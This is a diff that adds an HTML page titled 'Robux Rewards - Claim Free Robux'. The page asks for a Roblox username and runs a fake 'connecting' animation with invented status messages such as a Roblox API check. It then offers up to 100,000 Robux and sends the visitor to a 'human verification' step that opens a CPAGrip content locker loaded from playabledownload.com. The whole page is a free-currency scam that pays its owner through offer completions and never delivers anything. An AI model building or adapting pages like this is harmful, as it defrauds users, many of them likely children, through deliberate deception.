@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Rewards - Claim Free Robux</title>
+    <!-- Google Fonts & FontAwesome for Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #09090b 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(30, 27, 75, 0.6);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .logo-area {
+            margin-bottom: 20px;
+        }
+
+        .logo-area i {
+            font-size: 48px;
+            color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+            padding: 16px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        /* Step Panels */
+        .step-panel {
+            display: none;
+        }
+
+        .step-panel.active {
+            display: block;
+        }
+
+        /* Inputs & Buttons */
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(239, 68, 68, 0.6);
+        }
+
+        /* Robux Options Grid */
+        .robux-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .robux-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .robux-card:hover, .robux-card.selected {
+            border-color: #ef4444;
+            background: rgba(239, 68, 68, 0.08);
+        }
+
+        .robux-card img {
+            width: 36px;
+            margin-bottom: 8px;
+        }
+
+        .robux-card .amount {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        /* Loading Screen */
+        .loader-box {
+            margin: 20px 0;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(15, 23, 42, 0.8);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #ef4444;
+            transition: width 0.1s linear;
+            border-radius: 5px;
+        }
+
+        .status-text {
+            font-size: 13px;
+            color: #cbd5e1;
+            min-height: 20px;
+        }
+
+        .footer-note {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #64748b;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- STEP 1: Enter Username -->
+        <div id="step-1" class="step-panel active">
+            <div class="logo-area">
+                <i class="fa-solid fa-gem"></i>
+            </div>
+            <h1>Robux Reward</h1>
+            <p>Enter your Roblox username to connect to the rewards network.</p>
+            
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="text" id="usernameInput" placeholder="Roblox Username">
+            </div>
+            <button class="btn" onclick="startConnection()">Connect</button>
+        </div>
+
+        <!-- STEP 2: Connecting Loader -->
+        <div id="step-2" class="step-panel">
+            <div class="logo-area">
+                <i class="fa-solid fa-network-wired fa-spin"></i>
+            </div>
+            <h1>Connecting...</h1>
+            <p id="connectingUser">Establishing secure connection to network...</p>
+            
+            <div class="loader-box">
+                <div class="progress-bar-container">
+                    <div id="progressBar" class="progress-bar"></div>
+                </div>
+                <div id="statusText" class="status-text">Initializing...</div>
+            </div>
+        </div>
+
+        <!-- STEP 3: Select Amount -->
+        <div id="step-3" class="step-panel">
+            <h1>Select Amount</h1>
+            <p>Choose how many Robux you want to add to your account.</p>
+            
+            <div class="robux-grid">
+                <div class="robux-card" onclick="selectRobux(this, '10,000')">
+                    <i class="fa-solid fa-coins" style="font-size: 24px; color: #ef4444;"></i>
+                    <div class="amount">10,000</div>
+                </div>
+                <div class="robux-card" onclick="selectRobux(this, '25,000')">
+                    <i class="fa-solid fa-coins" style="font-size: 24px; color: #ef4444;"></i>
+                    <div class="amount">25,000</div>
+                </div>
+                <div class="robux-card" onclick="selectRobux(this, '50,000')">
+                    <i class="fa-solid fa-coins" style="font-size: 24px; color: #ef4444;"></i>
+                    <div class="amount">50,000</div>
+                </div>
+                <div class="robux-card selected" onclick="selectRobux(this, '100,000')">
+                    <i class="fa-solid fa-coins" style="font-size: 24px; color: #ef4444;"></i>
+                    <div class="amount">100,000</div>
+                </div>
+            </div>
+            <button class="btn" onclick="proceedToVerification()">Claim Selected</button>
+        </div>
+
+        <!-- STEP 4: Verification & Live CPAGrip Locker Trigger -->
+        <div id="step-4" class="step-panel">
+            <div class="logo-area">
+                <i class="fa-solid fa-shield-halved" style="color: #f59e0b; background: rgba(245, 158, 11, 0.1);"></i>
+            </div>
+            <h1>Verification Required</h1>
+            <p>Click below to complete human verification and release <strong id="claimedAmountText" style="color:white;">100,000</strong> Robux.</p>
+            
+            <!-- This button triggers your CPAGrip Locker script -->
+            <button class="btn" onclick="launchCpaLocker()">Verify Now</button>
+            
+            <div class="footer-note">Secure connection · Offers vary by region</div>
+        </div>
+    </div>
+
+    <!-- CPAGrip Content Locker Script Integration -->
+    <script type="text/javascript">var lck = false;</script>
+    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1918264"></script>
+    <script type="text/javascript">
+        // Fallback check if ad blocker blocks the script
+        if(!lck) {
+            // Uncomment below if you want automatic fallback redirection on block
+            // top.location = 'https://playabledownload.com/help/ablk.php?lkt=4'; 
+        }
+
+        let selectedRobuxAmount = "100,000";
+
+        function switchStep(stepNumber) {
+            document.querySelectorAll('.step-panel').forEach(panel => panel.classList.remove('active'));
+            document.getElementById(`step-${stepNumber}`).classList.add('active');
+        }
+
+        function startConnection() {
+            const username = document.getElementById('usernameInput').value.trim();
+            if(!username) {
+                alert('Please enter your Roblox username');
+                return;
+            }
+
+            document.getElementById('connectingUser').innerText = `Connecting account: ${username}`;
+            switchStep(2);
+
+            let width = 0;
+            const bar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            
+            const statuses = [
+                "Establishing secure connection…",
+                "Verifying username with Roblox API...",
+                "Locating reward pool...",
+                "Reserving points...",
+                "Connection successful!"
+            ];
+
+            let interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => switchStep(3), 600);
+                } else {
+                    width += 2;
+                    bar.style.width = width + '%';
+                    
+                    if(width === 20) statusText.innerText = statuses[1];
+                    if(width === 45) statusText.innerText = statuses[2];
+                    if(width === 75) statusText.innerText = statuses[3];
+                    if(width === 95) statusText.innerText = statuses[4];
+                }
+            }, 30);
+        }
+
+        function selectRobux(element, amount) {
+            document.querySelectorAll('.robux-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedRobuxAmount = amount;
+        }
+
+        function proceedToVerification() {
+            document.getElementById('claimedAmountText').innerText = selectedRobuxAmount;
+            switchStep(4);
+        }
+
+        // Function that calls the CPAGrip locker function when "Verify Now" is clicked
+        function launchCpaLocker() {
+            if (typeof _smc === 'function') {
+                _smc(); // Triggers the CPAGrip locker overlay
+            } else if (typeof call_locker === 'function') {
+                call_locker();
+            } else {
+                // Fallback direct execution if script uses external trigger
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
